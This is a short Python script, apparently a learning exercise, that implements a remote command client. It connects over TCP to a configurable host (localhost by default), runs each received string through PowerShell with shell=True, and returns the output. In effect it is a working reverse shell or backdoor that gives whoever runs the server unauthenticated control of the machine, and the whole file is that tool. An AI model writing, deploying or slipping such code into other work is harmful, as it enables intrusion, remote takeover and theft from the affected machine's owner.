# Client.py by Dinlon5566
import socket
import subprocess


class CommandClient:
    def __init__(self, host='localhost', port=8000):
        self.host = host
        self.port = port

    def start(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.host, self.port))

        while True:
            command = client.recv(1024).decode()
            try:
                output = subprocess.check_output(
                    f'powershell.exe {command}', shell=True)
                client.send(output)
            except subprocess.CalledProcessError as e:
                # 如果命令失敗，我們會接收到一個錯誤，這裡我們捕獲錯誤並將其發送回伺服器
                client.send(str(e).encode())


if __name__ == '__main__':
    # Initialize and start our client
    client = CommandClient()
    client.start()
